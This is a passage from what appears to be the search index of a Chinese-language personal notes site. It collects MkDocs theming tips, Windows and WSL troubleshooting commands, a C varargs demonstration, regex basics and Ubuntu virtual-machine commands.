}}/js/particles.js\"&gt;&lt;/script&gt;\n&lt;script src=\"{{ base_url }}/js/app.js\"&gt;&lt;/script&gt;\n\n{% endblock %}\n</code></pre> <p>\u8fd9\u91cc\u8fd8\u8981\u6ce8\u610f\uff0c\u4f7f\u7528 <code>{{base_url}}</code> \u6765\u786e\u4fdd js \u6587\u4ef6\u7684\u8def\u5f84\u3002</p> <p>\u6700\u540e\uff0c\u5728 <code>mkdocs.yml</code> \u4e2d\u7684 <code>theme</code> \u680f\u4e2d\u52a0\u4e0a <code>custom_dir: 'custom'</code> \uff0c\u5927\u529f\u544a\u6210\u3002</p> <p>\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u6309 F12 \u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u641c\u7d22 <code>particles</code>\uff0c\u80fd\u591f\u53d1\u73b0\u6211\u4eec\u63d2\u5165\u7684\u8fd9\u90e8\u5206\u5185\u5bb9\u51fa\u73b0\u5728 <code>body</code> \u5757\u4e2d\u95f4\u3002</p>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#tips","title":"Tips","text":"<ul> <li> <p>\u89c6\u9891\u63d2\u5165\u683c\u5f0f: </p><pre><code>![type:video](image/\u5e05\u5934\u786c.mp4)\n</code></pre> </li> <li> <p>\u56fe\u7247\u8c03\u6574\u5927\u5c0f:</p> </li> </ul> <p></p><pre><code>![[Example.png]]{ width=200px }\n</code></pre> \u7a7a\u683c\u683c\u5f0f\u4e0d\u80fd\u6539\u53d8 <ul> <li> <p>\u56fe\u7247\u5c45\u4e2d </p><pre><code>&lt;center&gt;![[TSGraph.png]]&lt;/center&gt;\n</code></pre> </li> <li> <p>\u5c45\u4e2d\u5c0f\u56fe\u7247 </p><pre><code>&lt;div style=\"text-align: center;\"&gt;\n&lt;img src=\"img.png\" width=\"50%\" style=\"margin: 0 auto;\"&gt;\n&lt;/div&gt;\n</code></pre> </li> </ul>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#appendix","title":"Appendix","text":"<p>Note</p> <p>Abstract</p> <p>Info</p> <p>Tip</p> <p>Success</p> <p>Question</p> <p>Warning</p> <p>Failure</p> <p>Danger</p> <p>Bug</p> <p>Example</p> <p>Quote</p>"},{"location":"Techniques/%E6%9D%82%E9%A1%B9/","title":"\u6742\u9879","text":""},{"location":"Techniques/%E6%9D%82%E9%A1%B9/#_1","title":"\u6742\u9879\u5c0f\u6280\u5de7","text":"<p> \u7ea6 1043 \u4e2a\u5b57  77 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <ul> <li>\u4f7f\u7528 <code>mklink /d mhwmod D:\\mhwmod</code> \u5efa\u7acb\u8f6f\u94fe\u63a5\uff08powershell \u4e0d\u652f\u6301\uff0c\u8981\u7528cmd\uff09</li> <li>\u5199\u6279\u5904\u7406\u811a\u672c\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5728\u6700\u540e\u4e00\u884c\u52a0\u4e0a\u547d\u4ee4 <code>pause</code> \u4f7f\u5176\u505c\u7559\u800c\u4e0d\u662f\u76f4\u63a5\u5173\u95ed</li> <li>\u63a8\u8350\u5b57\u4f53 0xProto Nerd Font Mono \uff1ahttps://www.nerdfonts.com/font-downloads</li> <li>\u5728 Github \u4ed3\u5e93\u9875\u9762\u6309\u4e0b \u3002 \u952e\uff0c\u5373\u53ef\u6253\u5f00 Web \u7f16\u8f91\u5668\uff0c\u66f4\u65b9\u4fbf\u67e5\u770b\u4ee3\u7801</li> <li>\u5728 Powershell \u4e2d\uff0cwhere \u662f Where-Object \u7684\u522b\u540d\uff0c\u56e0\u6b64\u60f3\u67e5\u627e\u6307\u4ee4\u4f4d\u7f6e\u7684\u8bdd\u7528 <code>Get-Command</code> \u6216\u8005 <code>where.exe</code> \u5427</li> </ul> <pre><code>&gt; Get-Command where\n\nCommandType     Name\n-----------     ----\nAlias           where -&gt; Where-Object\n\n&gt; where.exe tex\n\nD:\\texlive\\2023\\bin\\windows\\tex.exe\n</code></pre> <ul> <li>\u6ce8\u518c\u8868\u76f8\u5173<ul> <li>\u4e8b\u60c5\u7684\u8d77\u56e0\u662f bhh \u8001\u5e08\u7ed9\u4e86\u4e00\u4efd\u5947\u602a\u7684\u6ce8\u518c\u8868\u6587\u4ef6...\u8fd0\u884c\u5b8c\u6210\u540e\u6211\u7684\u7a0b\u5e8f\u90fd\u4ee5\u547d\u4ee4\u63d0\u793a\u7b26\u5f62\u5f0f\u8fd0\u884c\u4e86\uff0c\u8fd9\u5b9e\u5728\u662f\u592a\u4e11\u4e86\uff01\u6211\u96be\u4ee5\u5fcd\u53d7\uff0c\u56e0\u6b64\u4e0d\u65ad\u7ffb\u627e\u6ce8\u518c\u8868\u5e0c\u671b\u6539\u56de\u53bb\u3002</li> <li>\u5148\u53bb HKCU \u76ee\u5f55\u4e0b\u627e\u8981\u4fee\u6539\u7684\u6587\u4ef6\u540e\u7f00\u540d\uff0c\u6211\u7684\u8bdd\u5c31\u662f\u627e <code>.exe</code> \u3002\u627e\u5230\u540e\u53ef\u4ee5\u770b\u5230\u5176\u9ed8\u8ba4\u503c\u4e3a <code>exefile</code> </li> <li>\u7136\u540e\u5c31\u53bb\u627e <code>exefile</code> \uff0c\u5176\u5b50\u76ee\u5f55 shell \u6587\u4ef6\u5939\u4e0b\u9762\u5c31\u662f\u53f3\u952e\u83dc\u5355\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u987a\u4fbf\u6e05\u7406\u4e0b\u53f3\u952e\u83dc\u5355</li> <li>\u7136\u540e\u5728 <code>openn/command</code> \u4e2d\u53ef\u4ee5\u53d1\u73b0\u9ed8\u8ba4\u6253\u5f00\u65b9\u5f0f\u4e3a <code>\"%1\" %*</code> \uff0c\u5c06\u5b83\u6539\u4e3a <code>wt \"%1\" %*</code> \u540e\u786e\u5b9e\u53ef\u4ee5\u5f97\u5230\u6211\u60f3\u8981\u7684\u6548\u679c\uff0c\u4f46\u662f\u4e00\u4e9b\u666e\u901a\u7684\u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u524d\u4e5f\u4f1a\u5148\u542f\u52a8\u7ec8\u7aef\u4e86<ul> <li><code>%1</code> \u4ee3\u8868\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c<code>%0</code> \u4ee3\u8868\u7b2c\u4e00\u4e2a\u53c2\u6570\u5f00\u59cb\u7684\u6240\u6709\u53c2\u6570</li> </ul> </li> <li>\u6700\u7ec8\u53d1\u73b0\u53ea\u9700\u8981\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u5de6\u4e0a\u89d2\u53f3\u952e\uff0c\u9009\u62e9\u5c5e\u6027\uff0c\u5173\u95ed\u65e7\u7248\u63a7\u5236\u53f0\u9009\u9879\u5373\u53ef\uff0c\u767d\u8d39\u8fd9\u4e48\u5927\u529b\u6c14</li> </ul> </li> <li><code>CTRL K + CTRL C or CTRL U</code> \u5b9e\u73b0\u6279\u91cf\u6ce8\u91ca</li> <li><code>Win+V</code> \u67e5\u770b\u526a\u8d34\u677f\u8bb0\u5f55</li> <li>Powershell \u521b\u5efa\u6587\u4ef6\u53ef\u4ee5\u7528 <code>New-Item</code>\uff0c\u4e0d\u8fc7\u5728 windows \u76f4\u63a5\u7528 <code>md</code> \u547d\u4ee4\u5373\u53ef</li> <li><code>.\\run.exe | tee output</code> \u663e\u793a\u8fd0\u884c\u7ed3\u679c</li> <li><code>takeown \\f QQNT</code> \u83b7\u53d6\u6743\u9650<ul> <li>\u6216\u8005 <code>icacls QQNT /grant administrators:f</code></li> </ul> </li> <li>C\u8bed\u8a00\u73af\u5883\u7528 msys \u642d\u5efa\u5427\uff0c\u7f16\u8bd1\u5668\u7684\u4f18\u5316\u5dee\u8ddd\u771f\u7684\u5f88\u5927</li> <li>\u65b0\u5efa\u4e86 <code>.gitignore</code> \u4f46\u524d\u9762\u5df2\u4e0a\u4f20\u7684\u6587\u4ef6\u6ca1\u6709\u64a4\u56de\uff1f<ul> <li>\u4f7f\u7528 <code>git rm --cached -r  build</code> \u53d6\u6d88\u5bf9\u5176\u7684\u8ddf\u8e2a</li> </ul> </li> <li>\u5728\u4efb\u52a1\u7ba1\u7406\u5668\u4e2d\u7ed3\u675f WWAHOST \u8fdb\u7a0b\uff0c\u4ee5\u8df3\u8fc7\u7528\u6237\u767b\u5f55 OOBE \u521d\u59cb\u5316</li> </ul> <p>bhh \u8bfe\u4e0a\u5b66\u5230\u7684\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u4e00\u7aa5 <code>printf</code> \u51fd\u6570\u7684\u5b9e\u73b0\u65b9\u5f0f\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\ndouble f(char *s, void *v1, void *v2, void *v3)\n{\n    double sum = 0;\n    char *p = (char *)&amp;s;\n    p += sizeof(s);  // \u6307\u5411\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u5730\u5740(\u4e0d\u8fc7\u53c2\u6570\u4e5f\u662f\u6307\u9488\u5f62\u5f0f)\n    while (*s != '\\0')\n        switch (*s++)\n        {\n        case 'i': // int\n            sum += **(int **)(p); // \u7531\u4e8e\u53c2\u6570\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u800c p \u6307\u5411\u7684\u6307\u9488\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u5c06 p \u770b\u6210\u4e8c\u7ea7\u6307\u9488\u6765\u770b\u5f85\u5e76\u5f15\u7528\u4e24\u6b21\n            p += sizeof(int *); // \u52a0\u4e0a\u4e00\u4e2a\u6307\u9488\u7684\u5927\u5c0f\u5f97\u5230\u4e0b\u4e00\u4e2a\u53c2\u6570\u7684\u5730\u5740\n            break;\n        case 'l': // long\n            sum += **(long **)(p);\n            p += sizeof(long *);\n            break;\n        case 'd': // double\n            sum += **(double **)(p);\n            p += sizeof(double *);\n            break;\n        }\n    return sum;\n}\n\nint main(void)\n{\n    int a = 10;\n    long b = 20L;\n    double c = 30.0;\n\n    double s = f(\"ild\", &amp;a, &amp;b, &amp;c);\n    printf(\"%f\\n\", s);\n    // output: 60.000000\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u4f60\u4e5f\u53ef\u4ee5\u53c2\u8003\u6807\u51c6\u5e93 <code>stdarg.h</code> \u53ca\u5176\u4e2d\u7684 <code>vsprintf</code> \u51fd\u6570\u3002</p> <p>\u66f4\u52a0\u5e95\u5c42\u7684\u65b9\u5f0f\u8f93\u51fa\u6574\u6570\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\n\nint main(void)\n{\n    short int a = 0x1234;\n    for(int i = 0; i &lt; 16 ; ++i, a &lt;&lt;= 1)\n        putchar((a &lt; 0) + '0');\n}\n</code></pre> <p>\u5bf9\u4e8e\u6570\u7ec4\uff0c\u6839\u636e\u5176\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\uff0c\u4e00\u822c\u4ee5\u5982\u4e0b\u773c\u5149\u770b\u5f85\uff1a</p> <pre><code>d[0], d[1], d[2], ...\n</code></pre> <p>\u90a3\u4e48\u6309\u5b57\u8282\u5faa\u73af\u53f3\u79fb\uff0c\u4e0b\u6807\u7531\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u79fb\u52a8\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>d[n], d[0], d[1], ...\n</code></pre> <p>\u800c\u6bd4\u7279\u7ea7\u522b\u7684\u53f3\u79fb\u662f\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u79fb\u52a8\uff0c\u6ce8\u610f\u4e8c\u8005\u4e4b\u95f4\u7684\u533a\u522b\u3002</p> <p>python \u6253\u5305 EXE \u53ef\u4ee5\u7528 <code>pyinstaller</code>\uff0c\u4f46\u662f <code>pip install pyinstaller</code> \u4e0b\u8f7d\u8fc7\u6765\u7684\u6587\u4ef6\u5939\u540d\u53eb <code>PyInstaller</code>\uff0c\u9700\u8981\u533a\u5206\u5927\u5199\u4f7f\u7528\uff1a</p> <pre><code>python -m PyInstaller --onefile gui.py \n</code></pre> <ul> <li>\u4f7f\u7528 <code>from bs4 import BeautifulSoup</code> \u6765\u6293\u53d6\u9759\u6001\u7f51\u9875</li> <li>\u4f7f\u7528 <code>selenium</code> \u6765\u6293\u53d6\u52a8\u6001\u7f51\u9875</li> </ul> <p>WSL1 \u4e2d\uff0c\u8981\u8bbe\u7f6e\u901a\u8fc7\u5bbf\u4e3b\u673a\u4ee3\u7406\uff0c\u76f4\u63a5\u5728 <code>~/.bashrc</code> \u4e2d\u52a0\u4e0a\uff1a</p> <pre><code># .::: Proxy :::.\n# \u5bbf\u4e3b\u673a\u7684 IP \u5730\u5740\nhost_ip=127.0.0.1\n# \u8bbe\u7f6e\u4ee3\u7406\u7aef\u53e3\uff08\u6839\u636e\u4f60\u7684\u4ee3\u7406\u8f6f\u4ef6\u914d\u7f6e\uff09\nproxy_port=7890\n# \u8bbe\u7f6e\u4ee3\u7406\u73af\u5883\u53d8\u91cf\nexport http_proxy=\"http://$host_ip:$proxy_port\"\nexport https_proxy=\"http://$host_ip:$proxy_port\"\nexport all_proxy=\"socks5://$host_ip:$proxy_port\"\n# .::: Proxy :::.\n</code></pre>"},{"location":"Techniques/%E6%9D%82%E9%A1%B9/#wsl2","title":"WSL2 \u76f8\u5173","text":"<p>\u5fae\u8f6f\u7684\u8fd9wsl\u597d\u7528\u662f\u597d\u7528\uff0c\u9047\u5230\u7684bug\u4e00\u5806...</p> <p>\u5148\u662f WSL2 \u5206\u53d1\u5b89\u88c5\u4e0d\u4e86\uff0c\u663e\u793a <code>FE</code> \u7ed3\u5c3e\u7684\u9519\u8bef\u7801\uff0c\u6700\u7ec8\u9760\u6e05\u7406\u4e86\u4e00\u6ce2\u6ce8\u518c\u8868\u89e3\u51b3\u3002</p> <p>\u4f46\u662f WSL2 \u8fd8\u662f\u7528\u4e0d\u4e86\uff0c\u663e\u793a\uff1a</p> <pre><code>&gt; wsl -d kali-linux\n\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u5931\u8d25\u3002\n\u9519\u8bef\u4ee3\u7801: Wsl/Service/RPC_S_CALL_FAILED\n</code></pre> <p>\u5148\u6309\u7167 https://github.com/microsoft/WSL/blob/master/CONTRIBUTING.md#enable-automatic-crash-dump-collection \u7684\u65b9\u6cd5\u8bb0\u5f55\u5d29\u6e83\u65e5\u5fd7\uff1a</p> <pre><code>md C:\\crashes\nreg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\" /f\nreg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\" /v DumpFolder /t REG_EXPAND_SZ /d C:\\crashes /f\nreg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\" /v DumpType /t REG_DWORD /d 2 /f\n</code></pre> <p>\u7136\u540e\u7528 windows \u81ea\u5e26\u7684 windbg \u6253\u5f00 <code>.dmp</code> \u6587\u4ef6\u3002\u8bb0\u5f97\u5148 <code>CTRL+S</code> \u8bbe\u7f6e\u7b26\u53f7\u8868\u8def\u5f84\uff1a</p> <pre><code>SRV*C:\\Symbols*http://msdl.microsoft.com/download/symbols\n</code></pre> <p>\u5bfc\u5165\u540e\u8f93\u5165 <code>!analyze -v</code> \u5206\u6790\uff0c\u53ef\u4ee5\u770b\u5230\uff1a</p> <pre><code>STACK_COMMAND:  ~1s; .ecxr ; kb\n\nSYMBOL_NAME:  ldntvdm+132c\n\nMODULE_NAME: ldntvdm\n\nIMAGE_NAME:  ldntvdm.dll\n\nFAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_ldntvdm.dll!Unknown\n\nOS_VERSION:  10.0.26100.1\n\nBUILDLAB_STR:  ge_release\n\nOSPLATFORM_TYPE:  x64\n\nOSNAME:  Windows 10\n\nFAILURE_ID_HASH:  {c91c6b0b-23af-b325-08b3-37a44fff5217}\n\nFollowup:     MachineOwner\n</code></pre> <p>\u603b\u4e4b\u5c31\u662f\u8fd9\u4e2a <code>ldntvdm.dll</code> \u7684\u95ee\u9898\uff0c\u8fd9\u4e2a\u4e1c\u897f\u662f\u6211\u4e4b\u524d\u4e3a\u4e86\u5199 16bit \u7684\u6c47\u7f16\u800c\u5b89\u88c5\u7684\uff0c\u4e0d\u8fc7 24H2 \u66f4\u65b0\u540e\u597d\u50cf\u4e5f\u7528\u4e0d\u4e86\u4e86\u3002\u6240\u4ee5\u76f4\u63a5\u5220\u9664\uff0c\u6b64\u65f6 WSL2 \u5c31\u6062\u590d\u6b63\u5e38\u4e86\u3002</p> <p>\u60f3\u542f\u52a8 sshd(\u6216\u5176\u5b83) \u670d\u52a1\uff0c\u4f46\u662f\u603b\u62a5\u9519\uff1a</p> <pre><code>System has not been booted with systemd as init system (PID 1). Can't operate.  \nFailed to connect to bus: Host is down\n</code></pre> <p>\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a wsl config\uff1a</p> <pre><code>sudo /etc/wsl.conf\n</code></pre> <p>\u5e76\u52a0\u4e0a\uff1a</p> <pre><code>[boot]\nsystemd=true\n</code></pre> <p>ssh \u7ed9\u670d\u52a1\u5668\u7684 authorized_keys \u4e2d\u6dfb\u52a0\u4e0a\u516c\u94a5\u540e\u8fd8\u662f\u4e0d\u80fd\u7528\u5bc6\u94a5\u5bf9\u767b\u5f55\uff1f\u53ef\u80fd\u662f\u6587\u4ef6\u5939\u6216\u6587\u4ef6\u7684\u6743\u9650\u95ee\u9898\uff0c\u5c3d\u91cf\u4e0d\u8981\u81ea\u5df1\u521b\u5efa\u6587\u4ef6\u5939\u548c\u6587\u4ef6\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u5c06\u516c\u94a5\u590d\u5236\u5230\u5bf9\u5e94\u670d\u52a1\u5668\u4e0a\uff1a</p> <pre><code>ssh-copy-id -p 22 sora@xx.xx.xx.xx\n</code></pre>"},{"location":"Techniques/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p> \u7ea6 831 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>\u6d4b\u8bd5\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7f51\u7ad9\uff0c\u4e0d\u8fc7\u8bf4\u5b9e\u8bdd\u6709 AI \u5e2e\u5fd9\u751f\u6210\u6b63\u5219\u5df2\u7ecf\u5f88\u591f\u7528\u4e86</p> <p>\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u4e00\u79cd\u7528\u4e8e\u5339\u914d\u548c\u64cd\u4f5c\u6587\u672c\u7684\u5f3a\u5927\u5de5\u5177\uff0c\u5b83\u662f\u7531\u4e00\u7cfb\u5217\u5b57\u7b26\u548c\u7279\u6b8a\u5b57\u7b26\u7ec4\u6210\u7684\u6a21\u5f0f\uff0c\u7528\u4e8e\u63cf\u8ff0\u8981\u5339\u914d\u7684\u6587\u672c\u6a21\u5f0f\u3002</p>"},{"location":"Techniques/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_1","title":"\u666e\u901a\u5b57\u7b26","text":"<p>\u666e\u901a\u5b57\u7b26\u5305\u62ec\u6ca1\u6709\u663e\u5f0f\u6307\u5b9a\u4e3a\u5143\u5b57\u7b26\u7684\u6240\u6709\u53ef\u6253\u5370\u548c\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\u3002\u8fd9\u5305\u62ec\u6240\u6709\u5927\u5199\u548c\u5c0f\u5199\u5b57\u6bcd\u3001\u6240\u6709\u6570\u5b57\u3001\u6240\u6709\u6807\u70b9\u7b26\u53f7\u548c\u4e00\u4e9b\u5176\u4ed6\u7b26\u53f7\u3002</p> \u5b57\u7b26 \u63cf\u8ff0 [...] \u5339\u914d<code>[...]</code>\u4e2d\u7684\u6240\u6709\u5b57\u7b26\uff0c\u4f8b\u5982<code>[aeiou]</code>\u5c31\u4f1a\u628a\u5b57\u7b26\u4e32\u4e2d\u6240\u6709\u5143\u97f3\u5b57\u6bcd\u63d0\u53d6\u51fa\u6765 [^...] \u5339\u914d\u9664\u4e86<code>[...]</code>\u4e2d\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5373<code>[...]</code>\u7684\u8865\u96c6 [A-Z] <code>[A-Z]</code>\u8868\u793a\u4e00\u4e2a\u533a\u95f4\uff0c\u5339\u914d\u6240\u6709\u5927\u5199\u5b57\u6bcd\uff0c\u540c\u7406\u53ef\u4ee5\u6709<code>[0-9a-zA-Z]</code>\u6765\u5339\u914d\u6240\u6709\u5b57\u6bcd\u548c\u6570\u5b57 . \u5339\u914d\u6240\u6709\u9664\u6362\u884c\u7b26 (\\n,\\r) \u5916\u7684\u6240\u6709\u5355\u4e2a\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e<code>[^\\n\\r]</code> [\\s\\S] \\s \u6240\u6709\u7a7a\u767d\u7b26\uff0c\u5305\u62ec\u6362\u884c\uff1b\\S \u662f\u975e\u7a7a\u767d\u7b26\uff0c\u4e0d\u5305\u62ec\u6362\u884c\uff0c\u56e0\u6b64\u8be5\u8bed\u53e5\u4e5f\u662f\u5339\u914d\u6240\u6709\u5b57\u7b26 \\w \u5339\u914d\u6570\u7ec4\u3001\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\uff0c\u7b49\u4ef7\u4e8e<code>[0-9a-zA-Z_]</code> \\d \u5339\u914d\u4efb\u610f\u4e00\u4e2a\u963f\u62c9\u4f2f\u6570\u5b57\uff0c\u7b49\u4ef7\u4e8e<code>[0-9]</code>"},{"location":"Techniques/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_2","title":"\u975e\u6253\u5370\u5b57\u7b26","text":"<p>\u975e\u6253\u5370\u5b57\u7b26\u4e5f\u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7ec4\u6210\u90e8\u5206\u3002\u4e0b\u8868\u5217\u51fa\u4e86\u8868\u793a\u975e\u6253\u5370\u5b57\u7b26\u7684\u8f6c\u4e49\u5e8f\u5217\uff1a</p> \u5b57\u7b26 \u63cf\u8ff0 \\cx \u5339\u914d\u7531x\u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\u3002\u4f8b\u5982\uff0c <code>\\cM</code> \u5339\u914d\u4e00\u4e2a Control-M \u6216\u56de\u8f66\u7b26\u3002x \u7684\u503c\u5fc5\u987b\u4e3a A-Z \u6216 a-z \u4e4b\u4e00\u3002\u5426\u5219\uff0c\u5c06 c \u89c6\u4e3a\u4e00\u4e2a\u539f\u4e49\u7684 'c' \u5b57\u7b26\u3002 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\u3002\u7b49\u4ef7\u4e8e <code>\\x0c</code> \u548c <code>\\cL</code>\u3002 \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u7b49\u4ef7\u4e8e <code>\\x0a</code> \u548c <code>\\cJ</code>\u3002 \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\u3002\u7b49\u4ef7\u4e8e <code>\\x0d</code> \u548c <code>\\cM</code>\u3002 \\s \u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u5305\u62ec\u7a7a\u683c\u3001\u5236\u8868\u7b26\u3001\u6362\u9875\u7b26\u7b49\u7b49\u3002\u7b49\u4ef7\u4e8e <code>[ \\f\\n\\r\\t\\v]</code>\u3002\u6ce8\u610f Unicode \u6b63\u5219\u8868\u8fbe\u5f0f\u4f1a\u5339\u914d\u5168\u89d2\u7a7a\u683c\u7b26\u3002 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u5b57\u7b26\u3002\u7b49\u4ef7\u4e8e <code>[^ \\f\\n\\r\\t\\v]</code>\u3002 \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\u3002\u7b49\u4ef7\u4e8e <code>\\x09</code> \u548c <code>\\cI</code>\u3002 \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\u3002\u7b49\u4ef7\u4e8e <code>\\x0b</code> \u548c <code>\\cK</code>\u3002"},{"location":"Techniques/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_3","title":"\u9650\u5b9a\u7b26","text":"<p>\u9650\u5b9a\u7b26\u7528\u6765\u6307\u5b9a\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4e00\u4e2a\u7ed9\u5b9a\u7ec4\u4ef6\u5fc5\u987b\u8981\u51fa\u73b0\u591a\u5c11\u6b21\u624d\u80fd\u6ee1\u8db3\u5339\u914d\u3002\u6709\u00a0*\u00a0\u6216\u00a0+\u00a0\u6216\u00a0?\u00a0\u6216\u00a0{n}\u00a0\u6216\u00a0{n,}\u00a0\u6216\u00a0{n,m}\u00a0\u51716\u79cd\u3002</p> <p>\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u9650\u5b9a\u7b26\u6709\uff1a</p> \u5b57\u7b26 \u63cf\u8ff0 * \u5339\u914d\u524d\u9762\u7684\u8868\u8fbe\u5f0f\u96f6\u6b21\u6216\u591a\u6b21\uff0c\u4f8b\u5982\uff0c<code>go*d</code>\u80fd\u591f\u5339\u914d<code>gd</code>\u548c<code>goood</code>\u3002<code>*</code>\u7b49\u4ef7\u4e8e<code>{0,}</code> + \u5339\u914d\u524d\u9762\u7684\u8868\u8fbe\u5f0f\u4e00\u6b21\u6216\u591a\u6b21\u3002<code>*</code>\u7b49\u4ef7\u4e8e<code>{1,}</code> ? \u5339\u914d\u524d\u9762\u7684\u8868\u8fbe\u5f0f\u96f6\u6b21\u6216\u4e00\u6b21\uff0c\u4f8b\u5982\uff0c<code>do(es)?</code>\u53ef\u4ee5\u5339\u914d<code>do</code>\u548c<code>does</code>\u3002<code>?</code>\u7b49\u4ef7\u4e8e<code>{0,1}</code> {n} n\u662f\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\uff0c\u5339\u914d\u786e\u5b9a\u7684 n \u6b21\u3002\u4f8b\u5982\uff0c<code>o{2}</code>\u4e0d\u80fd\u5339\u914d<code>sob</code>\u4e2d\u7684<code>o</code>\uff0c\u4f46\u80fd\u5339\u914d<code>good</code>\u4e2d\u7684<code>oo</code> {n,} \u987e\u540d\u601d\u4e49\uff0c\u6307\u81f3\u5c11\u5339\u914d n \u6b21 {n,m} \u987e\u540d\u601d\u4e49\uff0c\u6307\u6700\u5c11\u5339\u914d n \u6b21\uff0c\u6700\u591a\u5339\u914d m \u6b21 <p>\u9650\u5b9a\u7b26\u7684\u8d2a\u5a6a\u6027</p> <p><code>*</code>\u548c<code>+</code>\u90fd\u662f\u8d2a\u5a6a\u7684\uff0c\u5373\u5b83\u4eec\u4f1a\u5c3d\u53ef\u80fd\u5339\u914d\u6700\u5927\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u5f53\u6211\u4eec\u5728\u5176\u540e\u9762\u52a0\u4e0a<code>?</code>\u53ef\u4ee5\u5b9e\u73b0\u975e\u8d2a\u5a6a\u6216\u6700\u5c0f\u5339\u914d</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u540c\u4e00\u4e2a html \u6807\u7b7e <code>&lt;h1&gt;Nimisora&lt;/h1&gt;</code></p> <ul> <li><code>&lt;.*&gt;</code> : <code>&lt;h1&gt;Nimisora&lt;/h1&gt;</code></li> <li><code>&lt;.*?&gt;</code> : <code>&lt;h1&gt;</code> and <code>&lt;/h1&gt;</code></li> </ul> <p>\u8fd8\u672a\u7f16\u5199\u5b8c\u6210\uff0c\u4f46\u662f\u8bb0\u4f4f\u4e0a\u9762\u51e0\u70b9\u4e5f\u5dee\u4e0d\u591a\u591f\u65e5\u5e38\u4f7f\u7528\u4e86</p>"},{"location":"Techniques/%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"\u865a\u62df\u673a","text":""},{"location":"Techniques/%E8%99%9A%E6%8B%9F%E6%9C%BA/#_1","title":"\u865a\u62df\u673a","text":"<p> \u7ea6 270 \u4e2a\u5b57  11 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u6211\u4f7f\u7528\u7684\u662fUbuntu 24.10\u7248\u672c</p> <p>\u8d85\u7ea7\u7528\u6237 </p><pre><code>sudo su\n</code></pre> <p>\u5f00\u542fSSH </p><pre><code>sudo service ssh start\n</code></pre> <p>\u751f\u6210\u5bc6\u94a5\u5e76\u514d\u5bc6\u8fde\u63a5</p> <pre><code>ssh-keygen\n</code></pre> <pre><code>ssh-copy-id yourname@yourip\n</code></pre> <p>\u5efa\u7acb\u6587\u4ef6\u5e76\u7528python\u7f16\u8bd1\u8fd0\u884c </p><pre><code>nano hello.py\npython hello.py\n</code></pre> <p>\u67e5\u770b\u5171\u4eab\u6587\u4ef6 </p><pre><code>sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other\ncd /mnt/hgfs\nls\n</code></pre> <p>\u89e3\u538b\u5b89\u88c5deb\u6587\u4ef6 </p><pre><code>sudo dpkg -i 